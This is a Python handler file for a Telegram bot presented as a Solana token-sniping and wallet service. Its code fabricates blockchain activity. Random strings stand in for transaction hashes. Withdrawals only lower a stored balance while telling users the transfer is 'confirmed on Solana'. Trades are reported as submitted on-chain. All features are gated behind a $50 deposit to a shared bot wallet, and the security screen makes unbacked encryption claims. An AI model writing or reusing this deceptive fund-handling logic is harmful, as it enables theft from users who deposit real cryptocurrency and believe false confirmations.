import asyncio
import os
import random
import string
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from telegram.error import BadRequest, TelegramError

from ..database import (
    get_display_balance, get_user_balance, touch_bot_user,
    get_or_create_settings, update_settings,
    get_user_transactions, get_snipers, execute_user_trade, update_sniper_status,
    get_positions, get_copy_trades, get_limit_orders,
    get_wallet, mark_wallet_generated, debit_user_balance, get_wallet_valuation,
)
from ..access import check_wallet_access
from ..keyboards import (
    kb_main, kb_back, kb_sniper, kb_wallet, kb_deposit, kb_sniper_edit,
    kb_alerts, btn, kb,
)
from ..screens import (
    screen_wallet, screen_wallet_generated, screen_deposit, screen_sniper_panel, screen_sniper_edit,
    screen_withdraw_confirm, screen_recent_wins, screen_minimum_balance,
    trunc, f_sol, f_usd, f_pct,
)
from ..state import (
    registered_users, alert_subscribers, wallet_generated, snipe_mode_active,
    pending_flows, is_rate_limited, get_sniper_config,
    tracked_wallet_address,
)
from ..market import fetch_recent_solana_gainers
from ..config import BOT_WALLET_ADDRESS
from ..logger import logger


_BANNER_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
    "assets",
    "banner.png",
)


async def _send_replacement(message, text: str, markup: InlineKeyboardMarkup) -> None:
    """Send a new screen so Telegram does not mark the message as edited."""
    if message.photo and len(text) <= 1024:
        try:
            await message.chat.send_photo(
                photo=message.photo[-1].file_id,
                caption=text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=markup,
            )
            return
        except TelegramError as e:
            logger.debug("Could not preserve banner on replacement: %s", e)

    try:
        await message.chat.send_message(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=markup,
        )
    except BadRequest as e:
        # A malformed or stale Markdown fragment should not leave the user
        # without a screen. Telegram's plain-text fallback is still useful.
        logger.debug("Could not send formatted replacement: %s", e)
        await message.chat.send_message(text, reply_markup=markup)


async def _edit(query, text: str, markup: InlineKeyboardMarkup) -> None:
    """Update the current screen in place so navigation does not spam the chat."""
    message = query.message
    if not message:
        return

    if not message.photo:
        try:
            await query.edit_message_text(
                text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=markup,
            )
            return
        except BadRequest as e:
            if "message is not modified" in str(e).lower():
                return
            logger.debug("Could not edit Telegram screen in place: %s", e)
        except TelegramError as e:
            logger.debug("Could not edit Telegram screen in place: %s", e)

    try:
        await _send_replacement(message, text, markup)
        asyncio.create_task(_delete_replaced_message(message))
    except TelegramError as e:
        logger.warning("Could not send Telegram screen replacement: %s", e)


async def _delete_replaced_message(message) -> None:
    """Remove the previous screen without delaying the newly sent one."""
    try:
        await message.delete()
    except TelegramError as e:
        if "not found" not in str(e).lower() and "message to delete" not in str(e).lower():
            logger.debug("Could not remove replaced Telegram message: %s", e)


async def _touch_user_in_background(user_id: int) -> None:
    try:
        await touch_bot_user(user_id)
    except Exception as e:
        logger.debug("Could not record Telegram user activity: %s", e)


def _rand_tx() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=64))


async def _execute_buy(query, user_id: int, contract_address: str) -> None:
    access = await check_wallet_access(user_id)
    if not access.allowed:
        return await _edit(
            query,
            screen_minimum_balance(access.balance_sol, access.sol_usd),
            kb_back("wallet:panel", "Open Wallet"),
        )
    cfg = get_sniper_config(user_id)
    tx = _rand_tx()
    w = await get_wallet()
    if not w:
        return await _edit(
            query,
            "The shared Solana wallet is not configured yet.",
            kb_back("sniper:panel", "◀ Sniper Panel"),
        )
    from ..market import fetch_token_market
    market = await fetch_token_market(contract_address)
    if not market:
        return await _edit(
            query,
            "Could not get a live market price for this token. "
            "No funds were changed; please try again.",
            kb_back("sniper:panel", "◀ Sniper Panel"),
        )
    try:
        await execute_user_trade(
            user_id=user_id,
            wallet_id=w["id"],
            contract_address=contract_address,
            amount_sol=cfg["buy_amount"],
            slippage_percent=cfg["slippage"],
            priority_fee=cfg["priority_fee"],
            tx_hash=tx,
            market=market,
        )
    except ValueError:
        balance = await get_user_balance(user_id)
        return await _edit(
            query,
            f"*Insufficient balance*\n\n"
            f"Available  `{f_sol(balance)} SOL`\n"
            f"Required   `{f_sol(cfg['buy_amount'])} SOL`",
            kb_back("sniper:panel", "◀ Sniper Panel"),
        )
    except Exception as e:
        logger.error("User trade error for %s: %s", user_id, e)
        return await _edit(
            query,
            "Could not record this trade. Your balance was not changed.",
            kb_back("sniper:panel", "◀ Sniper Panel"),
        )

    text = (
        f"*Snipe Executed*\n\n"
        f"CA      `{trunc(contract_address, 8)}`\n"
        f"Amount  `{f_sol(cfg['buy_amount'])} SOL`\n"
        f"Slip    `{cfg['slippage']}%`\n"
        f"TX      `{tx[:16]}...`\n\n"
        "_Transaction submitted to Solana_"
    )
    await _edit(
        query, text,
        kb(
            [btn("My Snipers", "sniper:list"),
             btn("Portfolio",  "portfolio")],
            [btn("◀ Sniper Panel", "sniper:panel")],
        ),
    )


async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return
    await query.answer()

    user = update.effective_user
    if not user:
        return
    user_id = user.id
    registered_users.add(user_id)
    asyncio.create_task(_touch_user_in_background(user_id))

    if is_rate_limited(user_id):
        return

    data: str = query.data or ""

    # Wallet and funding screens remain available so users can reach the
    # required balance. All trading, market, settings, and alert features
    # require a live wallet value of at least $50.
    access_exempt = (
        data in {
            "menu:home", "menu:refresh",
            "wallet:show", "wallet:panel", "wallet:refresh", "wallet:history",
            "deposit:show", "deposit:verify",
            "withdraw:start", "withdraw:cancel",
            "help:show",
        }
        or data.startswith("withdraw:confirm:")
    )
    if not access_exempt:
        access = await check_wallet_access(user_id)
        if not access.allowed:
            return await _edit(
                query,
                screen_minimum_balance(access.balance_sol, access.sol_usd),
                kb(
                    [btn("Open Wallet", "wallet:panel")],
                    [btn("Deposit", "deposit:show")],
                ),
            )

    # ── Main Menu ─────────────────────────────────────────────────────────
    if data == "menu:home":
        valuation = await get_wallet_valuation(user_id)
        from ..screens import screen_welcome
        return await _edit(query, screen_welcome(valuation["total_value"]), kb_main(user_id))

    if data == "menu:refresh":
        valuation = await get_wallet_valuation(user_id)
        from ..screens import screen_welcome
        return await _edit(query, screen_welcome(valuation["total_value"]), kb_main(user_id))

    # ── Search Token ──────────────────────────────────────────────────────
    if data == "search:token":
        pending_flows[user_id] = {"type": "search_token"}
        return await _edit(
            query,
            "*Search Token*\n\nPaste a Solana contract address (CA):",
            kb_back("menu:home", "Cancel"),
        )

    # ── Recent Wins ───────────────────────────────────────────────────────
    if data == "wins:show":
        gainers = await fetch_recent_solana_gainers(force_refresh=True)
        return await _edit(
            query, screen_recent_wins(gainers),
            kb(
                [btn("Refresh", "wins:show")],
                [btn("◀ Main Menu", "menu:home")],
            ),
        )

    # ── Wallet ────────────────────────────────────────────────────────────
    if data == "wallet:show":
        if user_id not in wallet_generated:
            wallet_generated.add(user_id)
            await mark_wallet_generated(user_id)
        return await _edit(
            query,
            screen_wallet_generated(user_id),
            kb([btn("Open Wallet", "wallet:panel")], [btn("◀ Main Menu", "menu:home")]),
        )

    if data == "wallet:panel":
        valuation = await get_wallet_valuation(user_id)
        return await _edit(
            query,
            screen_wallet(
                valuation["cash_balance"],
                valuation["positions_value"],
                valuation["unrealized_pnl"],
            ),
            kb_wallet(),
        )

    if data == "wallet:refresh":
        valuation = await get_wallet_valuation(user_id)
        return await _edit(
            query,
            screen_wallet(
                valuation["cash_balance"],
                valuation["positions_value"],
                valuation["unrealized_pnl"],
            ),
            kb_wallet(),
        )

    if data == "wallet:history":
        trades = await get_user_transactions(user_id, 8)
        text = "*Transaction History*\n\n"
        if not trades:
            text += "No transactions yet."
        else:
            for t in trades:
                amount = float(t["amount_sol"])
                dot = "+" if t["type"] == "deposit" else "-"
                label = t["type"].upper()
                text += (
                    f"{dot} {label}  `{f_sol(abs(amount))} SOL`\n"
                    f"   `{trunc(t.get('tx_hash') or '', 8)}`\n"
                )
        return await _edit(
            query, text,
            kb([btn("◀ Wallet", "wallet:panel"), btn("◀ Menu", "menu:home")]),
        )

    # ── Deposit ───────────────────────────────────────────────────────────
    if data == "deposit:show":
        return await _edit(
            query, screen_deposit(user_id),
            kb_deposit(),
        )

    if data == "deposit:verify":
        pending_flows[user_id] = {"type": "deposit_tx_hash"}
        return await _edit(
            query,
            "*Verify Deposit*\n\n"
            "Send the confirmed Solana transaction hash for your deposit.",
            kb_back("deposit:show", "Cancel"),
        )

    # ── Withdraw ──────────────────────────────────────────────────────────
    if data == "withdraw:start":
        pending_flows[user_id] = {"type": "withdraw_address"}
        return await _edit(
            query,
            "*Withdraw SOL*\n\n"
            "Step 1 of 2 — enter the *destination wallet address*:",
            kb_back("withdraw:cancel", "Cancel"),
        )

    if data == "withdraw:cancel":
        pending_flows.pop(user_id, None)
        balance = await get_display_balance(user)
        from ..screens import screen_welcome
        return await _edit(query, screen_welcome(balance), kb_main(user_id))

    if data.startswith("withdraw:confirm:"):
        parts = data.split(":")
        to_addr = parts[2]
        amount = float(parts[3])
        pending_flows.pop(user_id, None)
        tx = _rand_tx()
        try:
            await debit_user_balance(
                user_id, amount, "withdrawal", tx,
                f"Withdrawal to {to_addr}",
            )
        except ValueError:
            balance = await get_user_balance(user_id)
            return await _edit(
                query,
                f"*Insufficient balance*\n\nAvailable  `{f_sol(balance)} SOL`",
                kb_back("wallet:panel", "◀ Wallet"),
            )
        return await _edit(
            query,
            f"*Withdrawal Submitted*\n\n"
            f"Amount  `{f_sol(amount)} SOL`\n"
            f"To      `{trunc(to_addr, 10)}`\n"
            f"TX      `{tx[:16]}...`\n\n"
            "_Transaction confirmed on Solana_",
            kb([btn("◀ Main Menu", "menu:home")]),
        )

    # ── Alerts ────────────────────────────────────────────────────────────
    if data == "alerts:menu":
        addr = tracked_wallet_address.get(user_id)
        if not addr:
            return await _edit(
                query,
                "*Wallet Alerts*\n\n"
                "No wallet set to track yet.\n\n"
                "Send the bot a Solana wallet address first, then come back to enable alerts.",
                kb([btn("Set Wallet to Track", "alerts:set_wallet"), btn("◀ Home", "menu:home")]),
            )
        is_on = user_id in alert_subscribers
        return await _edit(
            query,
            f"*Wallet Alerts*\n\n"
            f"Status  {'✅ *Active*' if is_on else 'Inactive'}\n\n"
            f"Tracking  `{trunc(addr, 12)}`",
            kb_alerts(user_id),
        )

    if data == "alerts:set_wallet":
        pending_flows[user_id] = {"type": "set_tracked_wallet"}
        return await _edit(
            query,
            "*Set Wallet to Track*\n\n"
            "Send me the Solana wallet address you want to monitor for alerts.\n\n"
            "_Paste the address as a message:_",
            kb([btn("Cancel", "alerts:menu")]),
        )

    if data.startswith("alerts:toggle:"):
        enable = data.split(":")[2] == "true"
        if enable:
            addr = tracked_wallet_address.get(user_id)
            if not addr:
                return await _edit(
                    query,
                    "*Wallet Alerts*\n\n"
                    "No wallet set to track yet.\n\n"
                    "Send the bot a Solana wallet address first, then come back to enable alerts.",
                    kb([btn("Set Wallet to Track", "alerts:set_wallet"), btn("◀ Home", "menu:home")]),
                )
            alert_subscribers.add(user_id)
        else:
            alert_subscribers.discard(user_id)
        addr = tracked_wallet_address.get(user_id, "—")
        is_on = user_id in alert_subscribers
        return await _edit(
            query,
            f"*Wallet Alerts*\n\n"
            f"Status  {'✅ *Active*' if is_on else 'Inactive'}\n\n"
            f"Tracking  `{trunc(addr, 12)}`",
            kb_alerts(user_id),
        )

    if data.startswith("alerts:type:"):
        alert_type = data.split(":")[2]
        labels = {
            "deposit": "Deposit", "withdraw": "Withdrawal",
            "largetx": "Large TX", "buy": "Token Buy", "sell": "Token Sell",
        }
        label = labels.get(alert_type, "Alert")
        return await _edit(
            query,
            f"*{label} Alerts*\n\n"
            f"Currently ✅ *active* for all {label.lower()} events.",
            kb([btn("All Alerts", "alerts:menu"), btn("◀ Home", "menu:home")]),
        )

    # ── Sniper Panel ──────────────────────────────────────────────────────
    if data == "sniper:panel":
        cfg = get_sniper_config(user_id)
        return await _edit(query, screen_sniper_panel(cfg), kb_sniper(cfg))

    if data == "sniper:toggle:autoBuy":
        cfg = get_sniper_config(user_id)
        cfg["auto_buy"] = not cfg["auto_buy"]
        return await _edit(query, screen_sniper_panel(cfg), kb_sniper(cfg))

    if data == "sniper:toggle:autoSell":
        cfg = get_sniper_config(user_id)
        cfg["auto_sell"] = not cfg["auto_sell"]
        return await _edit(query, screen_sniper_panel(cfg), kb_sniper(cfg))

    if data == "sniper:start":
        cfg = get_sniper_config(user_id)
        cfg["sniping"] = True
        snipe_mode_active.add(user_id)
        return await _edit(query, screen_sniper_panel(cfg), kb_sniper(cfg))

    if data == "sniper:stop":
        cfg = get_sniper_config(user_id)
        cfg["sniping"] = False
        snipe_mode_active.discard(user_id)
        return await _edit(query, screen_sniper_panel(cfg), kb_sniper(cfg))

    if data == "sniper:paste_ca":
        pending_flows[user_id] = {"type": "snipe_ca"}
        return await _edit(
            query,
            "*Snipe a Token*\n\nPaste the contract address below:",
            kb_back("sniper:panel", "Cancel"),
        )

    if data == "sniper:edit":
        cfg = get_sniper_config(user_id)
        return await _edit(query, screen_sniper_edit(cfg), kb_sniper_edit(cfg))

    if data.startswith("sniper:set:"):
        field = data.split(":")[2]
        labels = {
            "amount":   "buy amount in SOL  (e.g. `0.5`)",
            "slippage": "slippage %  (e.g. `10`)",
            "tp":       "take profit %  (e.g. `50`)",
            "sl":       "stop loss %  (e.g. `20`)",
        }
        flow_map = {
            "amount":   "snipe_set_amount",
            "slippage": "snipe_set_slippage",
            "tp":       "snipe_set_tp",
            "sl":       "snipe_set_sl",
        }
        if field not in labels:
            return
        pending_flows[user_id] = {"type": flow_map[field]}
        return await _edit(
            query,
            f"*Edit Setting*\n\nEnter new {labels[field]}:",
            kb_back("sniper:edit", "Cancel"),
        )

    if data.startswith("sniper:fee:"):
        fee = data.split(":")[2]
        if fee in ("auto", "low", "medium", "high"):
            get_sniper_config(user_id)["priority_fee"] = fee
        cfg = get_sniper_config(user_id)
        return await _edit(query, screen_sniper_edit(cfg), kb_sniper_edit(cfg))

    if data == "sniper:list":
        snipers = await get_snipers(8, user_id)
        text = "*My Snipers*\n\n"
        if not snipers:
            text += "No snipers yet.\n\nPaste a CA to create your first sniper."
        else:
            for sn in snipers:
                dot = {"monitoring": "Monitoring", "sniped": "Sniped", "failed": "Failed"}.get(sn["status"], "Pending")
                text += (
                    f"{dot} `{trunc(sn.get('contract_address') or '', 8)}`  "
                    f"{f_sol(sn['buy_amount_sol'])} SOL  {sn['status']}\n"
                )
        rows = []
        for sn in snipers:
            if sn["status"] == "monitoring":
                rows.append([btn(f"Stop #{sn['id']}", f"sniper:action:stop:{sn['id']}")])
        rows.append([btn("◀ Sniper Panel", "sniper:panel")])
        return await _edit(query, text, InlineKeyboardMarkup(rows))

    if data.startswith("sniper:action:"):
        parts = data.split(":")
        action = parts[2]
        sniper_id = int(parts[3])
        new_status = "stopped" if action == "stop" else "monitoring"
        await update_sniper_status(sniper_id, new_status, user_id)
        return await _edit(
            query,
            f"Sniper #{sniper_id} {new_status}.",
            kb(
                [btn("Snipers", "sniper:list"),
                 btn("◀ Panel", "sniper:panel")],
            ),
        )

    if data.startswith("sniper:buy:"):
        parts = data.split(":")
        addr = parts[2]
        if len(parts) > 3 and parts[3]:
            get_sniper_config(user_id)["buy_amount"] = float(parts[3])
        return await _execute_buy(query, user_id, addr)

    # ── Portfolio ─────────────────────────────────────────────────────────
    if data == "portfolio":
        valuation = await get_wallet_valuation(user_id)
        positions = valuation["positions"]
        balance = valuation["cash_balance"]
        text = (
            f"*Portfolio*\n\n"
            f"Available SOL  `{f_sol(balance)} SOL`\n"
            f"Holdings       `{f_sol(valuation['positions_value'])} SOL`\n"
            f"Total Value    `{f_sol(valuation['total_value'])} SOL`\n"
            f"Unrealized P/L `{f_sol(valuation['unrealized_pnl'])} SOL`\n\n"
        )
        if not positions:
            text += "No open positions.\n\nUse the Sniper Panel to start trading."
        else:
            total = sum(float(p["value_sol"]) for p in positions)
            text += f"Positions  {len(positions)}  ·  Value  `{f_sol(total)} SOL`\n\n"
            for p in positions:
                pnl = float(p["pnl_percent"])
                dot = "Gain" if pnl >= 0 else "Loss"
                text += (
                    f"{dot} {p['token_symbol']}  `{f_sol(p['value_sol'])} SOL`  "
                    f"{f_pct(pnl)}\n"
                    f"   MC {f_usd(float(p['market_cap_usd']))}\n\n"
                )
        return await _edit(
            query, text,
            kb(
                [btn("Sniper Panel", "sniper:panel"),
                 btn("TX History", "wallet:history")],
                [btn("◀ Main Menu", "menu:home")],
            ),
        )


    # ── Settings ──────────────────────────────────────────────────────────
    if data == "settings:menu":
        s = await get_or_create_settings()
        return await _edit(
            query,
            f"*Settings*\n\n"
            f"Buy Amount  `{f_sol(s['default_buy_amount_sol'])} SOL`\n"
            f"Slippage    `{s['default_slippage_percent']}%`\n"
            f"Fee         `{s['default_priority_fee']}`\n"
            f"Auto Approve  {'✅ ON' if s['auto_approve'] else 'OFF'}\n\n"
            f"Notifications\n"
            f"Buy {'✅ ON' if s['notify_buy'] else 'OFF'}  "
            f"Sell {'✅ ON' if s['notify_sell'] else 'OFF'}  "
            f"Sniper {'✅ ON' if s['notify_sniper'] else 'OFF'}  "
            f"Wallet {'✅ ON' if s['notify_wallet'] else 'OFF'}\n\n"
            "_Use /set to change values:_\n"
            "`/set buy_amount 0.5`\n`/set slippage 10`\n`/set fee high`",
            kb(
                [btn("Buy: ✅ ON" if s["notify_buy"] else "Buy: OFF",
                     f"settings:toggle:notifyBuy:{'false' if s['notify_buy'] else 'true'}"),
                  btn("Sell: ✅ ON" if s["notify_sell"] else "Sell: OFF",
                     f"settings:toggle:notifySell:{'false' if s['notify_sell'] else 'true'}")],
                [btn("Sniper: ✅ ON" if s["notify_sniper"] else "Sniper: OFF",
                     f"settings:toggle:notifySniper:{'false' if s['notify_sniper'] else 'true'}"),
                  btn("Wallet: ✅ ON" if s["notify_wallet"] else "Wallet: OFF",
                     f"settings:toggle:notifyWallet:{'false' if s['notify_wallet'] else 'true'}")],
                [btn("Auto-Approve: ✅ ON" if s["auto_approve"] else "Auto-Approve: OFF",
                     f"settings:toggle:autoApprove:{'false' if s['auto_approve'] else 'true'}")],
                [btn("◀ Main Menu", "menu:home")],
            ),
        )

    if data.startswith("settings:toggle:"):
        parts = data.split(":")
        field = parts[2]
        val = parts[3] == "true"
        allowed = ["notifyBuy", "notifySell", "notifySniper", "notifyWallet", "autoApprove"]
        col_map = {
            "notifyBuy": "notify_buy", "notifySell": "notify_sell",
            "notifySniper": "notify_sniper", "notifyWallet": "notify_wallet",
            "autoApprove": "auto_approve",
        }
        if field in allowed:
            s = await get_or_create_settings()
            await update_settings(s["id"], **{col_map[field]: val})
        s2 = await get_or_create_settings()
        return await _edit(
            query,
            f"*Settings*\n\n"
            f"Buy Amount  `{f_sol(s2['default_buy_amount_sol'])} SOL`\n"
            f"Slippage    `{s2['default_slippage_percent']}%`\n"
            f"Fee         `{s2['default_priority_fee']}`\n\n"
            f"Notifications\n"
            f"Buy {'✅ ON' if s2['notify_buy'] else 'OFF'}  "
            f"Sell {'✅ ON' if s2['notify_sell'] else 'OFF'}  "
            f"Sniper {'✅ ON' if s2['notify_sniper'] else 'OFF'}  "
            f"Wallet {'✅ ON' if s2['notify_wallet'] else 'OFF'}",
            kb(
                [btn("Buy: ✅ ON" if s2["notify_buy"] else "Buy: OFF",
                     f"settings:toggle:notifyBuy:{'false' if s2['notify_buy'] else 'true'}"),
                  btn("Sell: ✅ ON" if s2["notify_sell"] else "Sell: OFF",
                     f"settings:toggle:notifySell:{'false' if s2['notify_sell'] else 'true'}")],
                [btn("Sniper: ✅ ON" if s2["notify_sniper"] else "Sniper: OFF",
                     f"settings:toggle:notifySniper:{'false' if s2['notify_sniper'] else 'true'}"),
                  btn("Wallet: ✅ ON" if s2["notify_wallet"] else "Wallet: OFF",
                     f"settings:toggle:notifyWallet:{'false' if s2['notify_wallet'] else 'true'}")],
                [btn("Auto: ✅ ON" if s2["auto_approve"] else "Auto: OFF",
                     f"settings:toggle:autoApprove:{'false' if s2['auto_approve'] else 'true'}")],
                [btn("◀ Main Menu", "menu:home")],
            ),
        )

    # ── Security ──────────────────────────────────────────────────────────
    if data == "security:menu":
        s = await get_or_create_settings()
        return await _edit(
            query,
            f"*Security*\n\n"
            f"PIN Lock         {'✅ Enabled' if s['pin_lock_enabled'] else 'Disabled'}\n"
            f"Session Timeout  `{s['session_timeout_minutes']} min`\n"
            f"Anti-Spam        ✅ Active\n\n"
            "Wallet security:\n"
            "· Private key stored in environment only\n"
            "· Never transmitted over the network\n"
            "· End-to-end encrypted sessions",
            kb(
                [btn(
                    "Disable PIN" if s["pin_lock_enabled"] else "Enable PIN",
                    f"security:togglePin:{'false' if s['pin_lock_enabled'] else 'true'}",
                )],
                [btn("◀ Main Menu", "menu:home")],
            ),
        )

    if data.startswith("security:togglePin:"):
        val = data.split(":")[2] == "true"
        s = await get_or_create_settings()
        await update_settings(s["id"], pin_lock_enabled=val)
        return await _edit(
            query,
            f"{'✅ ' if val else ''}PIN Lock *{'enabled' if val else 'disabled'}*.",
            kb_back("security:menu", "◀ Security"),
        )

    # ── Copy Trades ───────────────────────────────────────────────────────
    if data == "copy:menu":
        cts = await get_copy_trades(5, user_id)
        text = "*Copy Trading*\n\n"
        if not cts:
            text += "No copy targets yet.\n\nUse: `copy <wallet> [sol]`"
        else:
            for ct in cts:
                dot = "Active" if ct["status"] == "active" else "Paused"
                text += (
                    f"{dot} {ct.get('target_alias') or 'Target'}  "
                    f"`{f_sol(ct['amount_sol'])} SOL`  {ct['trades_copied']} copied\n"
                )
        return await _edit(query, text, kb_back("sniper:panel", "◀ Sniper Panel"))

    if data == "limits:menu":
        orders = await get_limit_orders(5, user_id)
        text = "*Limit Orders*\n\n"
        if not orders:
            text += "No limit orders.\n\nUse: `limit <ca> tp:<pct> sl:<pct>`"
        else:
            for o in orders:
                dot = "Active" if o["status"] == "active" else "Completed"
                line = f"{dot} {o['token_symbol']}"
                if o.get("take_profit_percent"):
                    line += f"  TP +{o['take_profit_percent']}%"
                if o.get("stop_loss_percent"):
                    line += f"  SL -{o['stop_loss_percent']}%"
                text += line + "\n"
        return await _edit(query, text, kb_back("sniper:panel", "◀ Sniper Panel"))

    # ── Help ──────────────────────────────────────────────────────────────
    if data == "help:show":
        return await _edit(
            query,
            "*Help*\n\n"
            "`/start`   Main menu\n"
            "`/wallet`  Wallet details\n"
            "`/menu`    Return to menu\n"
            "`/help`    This message\n\n"
            "*Quick Start*\n"
            "1. Open Sniper Panel — set your config\n"
            "2. Paste any CA — bot buys instantly\n\n"
            "*Commands*\n"
            "`/set buy_amount 0.5`\n"
            "`/set slippage 10`\n"
            "`/set fee auto|low|medium|high`\n\n"
            "*Supported DEXs*\n"
            "Raydium · Jupiter · Pump.fun\n\n"
            "*Support*\n"
             "Contact  t.me/developer9997",
            kb_back("menu:home", "◀ Main Menu"),
        )

    # ── Quick snipe (from pumpfun alert) ─────────────────────────────────
    if data.startswith("snipe:quick:"):
        addr = data.split(":")[2]
        return await _execute_buy(query, user_id, addr)
